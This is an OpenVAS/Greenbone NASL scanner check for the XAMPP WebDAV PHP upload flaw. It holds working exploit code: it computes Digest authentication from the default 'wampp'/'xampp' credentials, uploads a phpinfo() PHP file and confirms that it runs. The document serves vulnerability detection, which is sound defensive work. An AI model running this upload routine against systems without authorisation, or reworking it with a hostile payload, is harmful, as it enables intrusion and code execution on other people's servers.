# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:apachefriends:xampp";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802293");
  script_version("2025-09-17T05:39:26+0000");
  script_tag(name:"last_modification", value:"2025-09-17 05:39:26 +0000 (Wed, 17 Sep 2025)");
  script_tag(name:"creation_date", value:"2012-01-17 12:12:12 +0530 (Tue, 17 Jan 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2012-10062");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("XAMPP WebDAV PHP Upload Vulnerability (Jan 2012) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_xampp_http_detect.nasl");
  script_mandatory_keys("xampp/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"XAMPP is prone to a PHP upload vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP PUT request and checks the response.");

  script_tag(name:"insight", value:"The flaw exists because XAMPP contains a default username and
  password within the WebDAV folder, which allows attackers to gain unauthorized access to the
  system.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to gain
  unauthorized access to the system.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.

  A Workaround is to delete or change the default webdav password file.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72397");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18367");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108420/xampp_webdav_upload_php.rb.txt");
  script_xref(name:"URL", value:"http://serverpress.com/topic/xammp-webdav-security-patch/");
  script_xref(name:"URL", value:"https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/windows/http/xampp_webdav_upload_php.rb");
  script_xref(name:"URL", value:"https://www.apachefriends.org/index.html");
  script_xref(name:"URL", value:"https://www.vulncheck.com/advisories/xampp-webdav-php-upload-auth-bypass-rce");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if (!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

vtstrings = get_vt_strings();
host = http_host_name(port:port);

url = "/webdav/" + vtstrings["lowercase_rand"] + ".php";
req = http_put(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req);

nonce = eregmatch(pattern:'nonce="([^"]*)', string:res);
if(isnull(nonce[1]))
  exit(0);

nonce = nonce[1];
useragent = http_get_user_agent();

cnonce = rand();  ## Client Nonce
qop = "auth";     ## Quality of protection code
nc = "00000001";  ## nonce-count

ha1 = hexstr(MD5("wampp:XAMPP with WebDAV:xampp"));
ha2 = hexstr(MD5("PUT:" + url));
response = hexstr(MD5(string(ha1, ":", nonce, ":", nc, ":", cnonce, ":", qop, ":", ha2)));

data = "<?php phpinfo();?>";
req = string("PUT ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             'Authorization: Digest username="wampp", realm="XAMPP with WebDAV",',
             'nonce="',nonce,'",', 'uri="',url,'", algorithm=MD5,',
             'response="', response,'", qop=', qop,', nc=',nc,', cnonce="',cnonce,'"',"\r\n",
             "Content-Length: ", strlen(data), "\r\n\r\n", data);
res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 201") {
  if(http_vuln_check(port:port, url:url, pattern:">phpinfo\(\)<")) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
